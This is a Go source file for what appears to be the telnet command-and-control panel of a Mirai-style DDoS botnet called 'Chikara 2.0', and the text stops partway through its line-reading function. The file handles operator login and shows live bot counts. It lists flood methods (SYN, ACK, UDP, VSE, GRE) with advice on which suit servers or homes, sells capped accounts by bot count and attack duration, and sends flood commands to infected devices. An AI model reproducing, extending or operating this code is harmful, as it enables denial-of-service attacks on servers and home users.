package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
	
    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[0;36mпользователь\x1b[0;37m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[0;36mпроходить\x1b[0;37m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;36mNuclear Code Incorrect!\r\n"))
        this.conn.Write([]byte("\x1b[0;36mPress Any Key To Exit\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded %d | %s \007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\r\x1b[0;37m     W E L C O M E  T O  C H I K A R A  V E R S I O N  2.0   \r\n"))
	this.conn.Write([]byte("\r       \x1b[0;37m██████\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╗  \x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╗  \x1b[0;37m██\x1b[0;36m╗ \x1b[0;37m█████\x1b[0;36m╗ \x1b[0;37m██████\x1b[0;36m╗  \x1b[0;37m█████\x1b[0;36m╗    \r\n"))
	this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;36m╔════╝\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║ \x1b[0;37m██\x1b[0;36m╔╝\x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m╗   \r\n"))
	this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;36m║     \x1b[0;37m███████\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║\x1b[0;37m█████\x1b[0;36m╔╝ \x1b[0;37m███████\x1b[0;36m║\x1b[0;37m██████\x1b[0;36m╔╝\x1b[0;37m███████\x1b[0;36m║   \r\n"))
	this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;36m║     \x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m╔═\x1b[0;37m██\x1b[0;36m╗ \x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m║    \r\n"))
	this.conn.Write([]byte("\r      \x1b[0;36m╚\x1b[0;37m██████\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m║   \r\n"))
	this.conn.Write([]byte("\r      \x1b[0;36m ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝            \r\n"))

	this.conn.Write([]byte("\r\n"))
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[0;36m" + username + "\x1b[0;37m@\x1b[0;36mchikara\x1b[0;37m# \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "chikara" || cmd == "chik" || cmd == "cls" || cmd == "clear" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\r\x1b[0;37m     W E L C O M E  T O  C H I K A R A  V E R S I O N  2.0   \r\n"))
			this.conn.Write([]byte("\r       \x1b[0;37m██████\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╗  \x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╗  \x1b[0;37m██\x1b[0;36m╗ \x1b[0;37m█████\x1b[0;36m╗ \x1b[0;37m██████\x1b[0;36m╗  \x1b[0;37m█████\x1b[0;36m╗    \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;36m╔════╝\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║ \x1b[0;37m██\x1b[0;36m╔╝\x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m╗   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;36m║     \x1b[0;37m███████\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║\x1b[0;37m█████\x1b[0;36m╔╝ \x1b[0;37m███████\x1b[0;36m║\x1b[0;37m██████\x1b[0;36m╔╝\x1b[0;37m███████\x1b[0;36m║   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;36m║     \x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m╔═\x1b[0;37m██\x1b[0;36m╗ \x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m╔══\x1b[0;37m██\x1b[0;36m║    \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;36m╚\x1b[0;37m██████\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m╗\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m║\x1b[0;37m██\x1b[0;36m║  \x1b[0;37m██\x1b[0;36m║   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;36m ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝            \r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if err != nil || cmd == "yellow" || cmd == "YELLOW" || cmd == "yel" || cmd == "YEL" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\r\x1b[0;37m     W E L C O M E  T O  C H I K A R A  V E R S I O N  2.0   \r\n"))
			this.conn.Write([]byte("\r       \x1b[0;37m██████\x1b[0;33m╗\x1b[0;37m██\x1b[0;33m╗  \x1b[0;37m██\x1b[0;33m╗\x1b[0;37m██\x1b[0;33m╗\x1b[0;37m██\x1b[0;33m╗  \x1b[0;37m██\x1b[0;33m╗ \x1b[0;37m█████\x1b[0;33m╗ \x1b[0;37m██████\x1b[0;33m╗  \x1b[0;37m█████\x1b[0;33m╗    \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;33m╔════╝\x1b[0;37m██\x1b[0;33m║  \x1b[0;37m██\x1b[0;33m║\x1b[0;37m██\x1b[0;33m║\x1b[0;37m██\x1b[0;33m║ \x1b[0;37m██\x1b[0;33m╔╝\x1b[0;37m██\x1b[0;33m╔══\x1b[0;37m██\x1b[0;33m╗\x1b[0;37m██\x1b[0;33m╔══\x1b[0;37m██\x1b[0;33m╗\x1b[0;37m██\x1b[0;33m╔══\x1b[0;37m██\x1b[0;33m╗   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;33m║     \x1b[0;37m███████\x1b[0;33m║\x1b[0;37m██\x1b[0;33m║\x1b[0;37m█████\x1b[0;33m╔╝ \x1b[0;37m███████\x1b[0;33m║\x1b[0;37m██████\x1b[0;33m╔╝\x1b[0;37m███████\x1b[0;33m║   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;33m║     \x1b[0;37m██\x1b[0;33m╔══\x1b[0;37m██\x1b[0;33m║\x1b[0;37m██\x1b[0;33m║\x1b[0;37m██\x1b[0;33m╔═\x1b[0;37m██\x1b[0;33m╗ \x1b[0;37m██\x1b[0;33m╔══\x1b[0;37m██\x1b[0;33m║\x1b[0;37m██\x1b[0;33m╔══\x1b[0;37m██\x1b[0;33m╗\x1b[0;37m██\x1b[0;33m╔══\x1b[0;37m██\x1b[0;33m║    \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;33m╚\x1b[0;37m██████\x1b[0;33m╗\x1b[0;37m██\x1b[0;33m║  \x1b[0;37m██\x1b[0;33m║\x1b[0;37m██\x1b[0;33m║\x1b[0;37m██\x1b[0;33m║  \x1b[0;37m██\x1b[0;33m╗\x1b[0;37m██\x1b[0;33m║  \x1b[0;37m██\x1b[0;33m║\x1b[0;37m██\x1b[0;33m║  \x1b[0;37m██\x1b[0;33m║\x1b[0;37m██\x1b[0;33m║  \x1b[0;37m██\x1b[0;33m║   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;33m ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝            \r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if err != nil || cmd == "blue" || cmd == "BLUE" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\r\x1b[0;37m     W E L C O M E  T O  C H I K A R A  V E R S I O N  2.0   \r\n"))
			this.conn.Write([]byte("\r       \x1b[0;37m██████\x1b[0;34m╗\x1b[0;37m██\x1b[0;34m╗  \x1b[0;37m██\x1b[0;34m╗\x1b[0;37m██\x1b[0;34m╗\x1b[0;37m██\x1b[0;34m╗  \x1b[0;37m██\x1b[0;34m╗ \x1b[0;37m█████\x1b[0;34m╗ \x1b[0;37m██████\x1b[0;34m╗  \x1b[0;37m█████\x1b[0;34m╗    \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;34m╔════╝\x1b[0;37m██\x1b[0;34m║  \x1b[0;37m██\x1b[0;34m║\x1b[0;37m██\x1b[0;34m║\x1b[0;37m██\x1b[0;34m║ \x1b[0;37m██\x1b[0;34m╔╝\x1b[0;37m██\x1b[0;34m╔══\x1b[0;37m██\x1b[0;34m╗\x1b[0;37m██\x1b[0;34m╔══\x1b[0;37m██\x1b[0;34m╗\x1b[0;37m██\x1b[0;34m╔══\x1b[0;37m██\x1b[0;34m╗   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;34m║     \x1b[0;37m███████\x1b[0;34m║\x1b[0;37m██\x1b[0;34m║\x1b[0;37m█████\x1b[0;34m╔╝ \x1b[0;37m███████\x1b[0;34m║\x1b[0;37m██████\x1b[0;34m╔╝\x1b[0;37m███████\x1b[0;34m║   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;34m║     \x1b[0;37m██\x1b[0;34m╔══\x1b[0;37m██\x1b[0;34m║\x1b[0;37m██\x1b[0;34m║\x1b[0;37m██\x1b[0;34m╔═\x1b[0;37m██\x1b[0;34m╗ \x1b[0;37m██\x1b[0;34m╔══\x1b[0;37m██\x1b[0;34m║\x1b[0;37m██\x1b[0;34m╔══\x1b[0;37m██\x1b[0;34m╗\x1b[0;37m██\x1b[0;34m╔══\x1b[0;37m██\x1b[0;34m║    \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;34m╚\x1b[0;37m██████\x1b[0;34m╗\x1b[0;37m██\x1b[0;34m║  \x1b[0;37m██\x1b[0;34m║\x1b[0;37m██\x1b[0;34m║\x1b[0;37m██\x1b[0;34m║  \x1b[0;37m██\x1b[0;34m╗\x1b[0;37m██\x1b[0;34m║  \x1b[0;37m██\x1b[0;34m║\x1b[0;37m██\x1b[0;34m║  \x1b[0;37m██\x1b[0;34m║\x1b[0;37m██\x1b[0;34m║  \x1b[0;37m██\x1b[0;34m║   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;34m ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝            \r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if err != nil || cmd == "pink" || cmd == "PINK" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\r\x1b[0;37m     W E L C O M E  T O  C H I K A R A  V E R S I O N  2.0   \r\n"))
			this.conn.Write([]byte("\r       \x1b[0;37m██████\x1b[1;35m╗\x1b[0;37m██\x1b[1;35m╗  \x1b[0;37m██\x1b[1;35m╗\x1b[0;37m██\x1b[1;35m╗\x1b[0;37m██\x1b[1;35m╗  \x1b[0;37m██\x1b[1;35m╗ \x1b[0;37m█████\x1b[1;35m╗ \x1b[0;37m██████\x1b[1;35m╗  \x1b[0;37m█████\x1b[1;35m╗    \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[1;35m╔════╝\x1b[0;37m██\x1b[1;35m║  \x1b[0;37m██\x1b[1;35m║\x1b[0;37m██\x1b[1;35m║\x1b[0;37m██\x1b[1;35m║ \x1b[0;37m██\x1b[1;35m╔╝\x1b[0;37m██\x1b[1;35m╔══\x1b[0;37m██\x1b[1;35m╗\x1b[0;37m██\x1b[1;35m╔══\x1b[0;37m██\x1b[1;35m╗\x1b[0;37m██\x1b[1;35m╔══\x1b[0;37m██\x1b[1;35m╗   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[1;35m║     \x1b[0;37m███████\x1b[1;35m║\x1b[0;37m██\x1b[1;35m║\x1b[0;37m█████\x1b[1;35m╔╝ \x1b[0;37m███████\x1b[1;35m║\x1b[0;37m██████\x1b[1;35m╔╝\x1b[0;37m███████\x1b[1;35m║   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[1;35m║     \x1b[0;37m██\x1b[1;35m╔══\x1b[0;37m██\x1b[1;35m║\x1b[0;37m██\x1b[1;35m║\x1b[0;37m██\x1b[1;35m╔═\x1b[0;37m██\x1b[1;35m╗ \x1b[0;37m██\x1b[1;35m╔══\x1b[0;37m██\x1b[1;35m║\x1b[0;37m██\x1b[1;35m╔══\x1b[0;37m██\x1b[1;35m╗\x1b[0;37m██\x1b[1;35m╔══\x1b[0;37m██\x1b[1;35m║    \r\n"))
			this.conn.Write([]byte("\r      \x1b[1;35m╚\x1b[0;37m██████\x1b[1;35m╗\x1b[0;37m██\x1b[1;35m║  \x1b[0;37m██\x1b[1;35m║\x1b[0;37m██\x1b[1;35m║\x1b[0;37m██\x1b[1;35m║  \x1b[0;37m██\x1b[1;35m╗\x1b[0;37m██\x1b[1;35m║  \x1b[0;37m██\x1b[1;35m║\x1b[0;37m██\x1b[1;35m║  \x1b[0;37m██\x1b[1;35m║\x1b[0;37m██\x1b[1;35m║  \x1b[0;37m██\x1b[1;35m║   \r\n"))
			this.conn.Write([]byte("\r      \x1b[1;35m ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝            \r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if err != nil || cmd == "red" || cmd == "RED" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\r\x1b[0;37m     W E L C O M E  T O  C H I K A R A  V E R S I O N  2.0   \r\n"))
			this.conn.Write([]byte("\r       \x1b[0;37m██████\x1b[0;31m╗\x1b[0;37m██\x1b[0;31m╗  \x1b[0;37m██\x1b[0;31m╗\x1b[0;37m██\x1b[0;31m╗\x1b[0;37m██\x1b[0;31m╗  \x1b[0;37m██\x1b[0;31m╗ \x1b[0;37m█████\x1b[0;31m╗ \x1b[0;37m██████\x1b[0;31m╗  \x1b[0;37m█████\x1b[0;31m╗    \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;31m╔════╝\x1b[0;37m██\x1b[0;31m║  \x1b[0;37m██\x1b[0;31m║\x1b[0;37m██\x1b[0;31m║\x1b[0;37m██\x1b[0;31m║ \x1b[0;37m██\x1b[0;31m╔╝\x1b[0;37m██\x1b[0;31m╔══\x1b[0;37m██\x1b[0;31m╗\x1b[0;37m██\x1b[0;31m╔══\x1b[0;37m██\x1b[0;31m╗\x1b[0;37m██\x1b[0;31m╔══\x1b[0;37m██\x1b[0;31m╗   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;31m║     \x1b[0;37m███████\x1b[0;31m║\x1b[0;37m██\x1b[0;31m║\x1b[0;37m█████\x1b[0;31m╔╝ \x1b[0;37m███████\x1b[0;31m║\x1b[0;37m██████\x1b[0;31m╔╝\x1b[0;37m███████\x1b[0;31m║   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;37m██\x1b[0;31m║     \x1b[0;37m██\x1b[0;31m╔══\x1b[0;37m██\x1b[0;31m║\x1b[0;37m██\x1b[0;31m║\x1b[0;37m██\x1b[0;31m╔═\x1b[0;37m██\x1b[0;31m╗ \x1b[0;37m██\x1b[0;31m╔══\x1b[0;37m██\x1b[0;31m║\x1b[0;37m██\x1b[0;31m╔══\x1b[0;37m██\x1b[0;31m╗\x1b[0;37m██\x1b[0;31m╔══\x1b[0;37m██\x1b[0;31m║    \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;31m╚\x1b[0;37m██████\x1b[0;31m╗\x1b[0;37m██\x1b[0;31m║  \x1b[0;37m██\x1b[0;31m║\x1b[0;37m██\x1b[0;31m║\x1b[0;37m██\x1b[0;31m║  \x1b[0;37m██\x1b[0;31m╗\x1b[0;37m██\x1b[0;31m║  \x1b[0;37m██\x1b[0;31m║\x1b[0;37m██\x1b[0;31m║  \x1b[0;37m██\x1b[0;31m║\x1b[0;37m██\x1b[0;31m║  \x1b[0;37m██\x1b[0;31m║   \r\n"))
			this.conn.Write([]byte("\r      \x1b[0;31m ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝            \r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
        if err != nil || cmd == "?i" || cmd == "?I" || cmd == "info" {
			this.conn.Write([]byte("\x1b[0;37mChikara Attack Method Information\r\n"))
			this.conn.Write([]byte("\x1b[0;36mxmas     \x1b[0;37m#\x1b[0;36m Protocol: tcp \x1b[0;37m#\x1b[0;36m Information: heavily flagged tcp flood\r\n"))
			this.conn.Write([]byte("\x1b[0;36mstd      \x1b[0;37m#\x1b[0;36m Protocol: tcp \x1b[0;37m#\x1b[0;36m Information: raw std attack\r\n"))
			this.conn.Write([]byte("\x1b[0;36mudpplain \x1b[0;37m#\x1b[0;36m Protocol: udp \x1b[0;37m#\x1b[0;36m Information: plain udp attack\r\n"))
			this.conn.Write([]byte("\x1b[0;36mack      \x1b[0;37m#\x1b[0;36m Protocol: tcp \x1b[0;37m#\x1b[0;36m Information: raw ack flood\r\n"))
			this.conn.Write([]byte("\x1b[0;36msyn      \x1b[0;37m#\x1b[0;36m Protocol: tcp \x1b[0;37m#\x1b[0;36m Information: raw syn syn\r\n"))
			this.conn.Write([]byte("\x1b[0;36mvse      \x1b[0;37m#\x1b[0;36m Protocol: udp \x1b[0;37m#\x1b[0;36m Information: valve source engine flood\r\n"))
			this.conn.Write([]byte("\x1b[0;36mudp      \x1b[0;37m#\x1b[0;36m Protocol: udp \x1b[0;37m#\x1b[0;36m Information: raw udp flood\r\n"))
			this.conn.Write([]byte("\x1b[0;36mgreeth   \x1b[0;37m#\x1b[0;36m Protocol: tcp \x1b[0;37m#\x1b[0;36m Information: gre ethernet flood\r\n"))
			this.conn.Write([]byte("\x1b[0;36mgreip    \x1b[0;37m#\x1b[0;36m Protocol: tcp \x1b[0;37m#\x1b[0;36m Information: gre ip flood\r\n"))
			continue
		}
		if err != nil || cmd == "?" || cmd == "?h" || cmd == "help" {
			this.conn.Write([]byte("\x1b[0;37mChikara Attack Method Prefix\r\n"))
			this.conn.Write([]byte("\x1b[0;36mdefined port \x1b[0;37m# [\x1b[0;36mMethod\x1b[0;37m] [\x1b[0;36mTarget\x1b[0;37m] [\x1b[0;36mTime\x1b[0;37m] \x1b[0;36mdport=\x1b[0;37m[\x1b[0;36mPort\x1b[0;37m]\r\n"))
			this.conn.Write([]byte("\x1b[0;36mrandom port  \x1b[0;37m# [\x1b[0;36mMethod\x1b[0;37m] [\x1b[0;36mTarget\x1b[0;37m] [\x1b[0;36mTime\x1b[0;37m]\r\n"))
			this.conn.Write([]byte("\x1b[0;37mChikara Extra Commands\r\n"))
			this.conn.Write([]byte("\x1b[0;36mmethod info  \x1b[0;37m#\x1b[0;36m ?i or info\x1b[0;37m\r\n"))
			this.conn.Write([]byte("\x1b[0;36mmethod usage \x1b[0;37m#\x1b[0;36m ?u or usage\r\n"))
			this.conn.Write([]byte("\x1b[0;36mcommon ports \x1b[0;37m#\x1b[0;36m ?p or ports\r\n"))
			continue
		}
		if err != nil || cmd == "?u" || cmd == "?U" || cmd == "usage" {
			this.conn.Write([]byte("\x1b[0;37mChikara Attack Method Usage\r\n"))
			this.conn.Write([]byte("\x1b[0;36mxmas     \x1b[0;37m#\x1b[0;36m Usage: high and low end servers\r\n"))
			this.conn.Write([]byte("\x1b[0;36mstd      \x1b[0;37m#\x1b[0;36m Usage: low end servers\r\n"))
			this.conn.Write([]byte("\x1b[0;36mudpplain \x1b[0;37m#\x1b[0;36m Usage: high end servers for high mpps \r\n"))
			this.conn.Write([]byte("\x1b[0;36mack      \x1b[0;37m#\x1b[0;36m Usage: low end server or homes\r\n"))
			this.conn.Write([]byte("\x1b[0;36msyn      \x1b[0;37m#\x1b[0;36m Usage: low end servers or homes\r\n"))
			this.conn.Write([]byte("\x1b[0;36mvse      \x1b[0;37m#\x1b[0;36m Usage: low end servers or homes\r\n"))
			this.conn.Write([]byte("\x1b[0;36mudp      \x1b[0;37m#\x1b[0;36m Usage: low end servers or homes\r\n"))
			this.conn.Write([]byte("\x1b[0;36mgreeth   \x1b[0;37m#\x1b[0;36m Usage: high and low end servers\r\n"))
			this.conn.Write([]byte("\x1b[0;36mgreip    \x1b[0;37m#\x1b[0;36m Usage: high and low end servers\r\n"))
            continue
        }
		if err != nil || cmd == "?p" || cmd == "?P" || cmd == "ports" {
			this.conn.Write([]byte("\x1b[0;37mChikara Attack Method Information\r\n"))
			this.conn.Write([]byte("\x1b[0;36mftp      \x1b[0;37m#\x1b[0;36m Port: 21\r\n"))
			this.conn.Write([]byte("\x1b[0;36mssh      \x1b[0;37m#\x1b[0;36m Port: 22\r\n"))
			this.conn.Write([]byte("\x1b[0;36mtelnet   \x1b[0;37m#\x1b[0;36m Port: 23\r\n"))
			this.conn.Write([]byte("\x1b[0;36mdomain   \x1b[0;37m#\x1b[0;36m Port: 53\r\n"))
			this.conn.Write([]byte("\x1b[0;36mhttp     \x1b[0;37m#\x1b[0;36m Port: 80\r\n"))
			this.conn.Write([]byte("\x1b[0;36mhttps    \x1b[0;37m#\x1b[0;36m Port: 443\r\n"))
			this.conn.Write([]byte("\x1b[0;36mmysql    \x1b[0;37m#\x1b[0;36m Port: 3306\r\n"))
            continue
        }
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter New Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter New Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter Max Bot Count (-1 For Full Net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("Max Attack Duration (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36m%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (Y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        if cmd == "botcount" || cmd == "bots" || cmd == "count" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36m%s: \x1b[0;37m%d\033[0m\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36mchikara.total: \x1b[0;37m%d\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[0;36m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
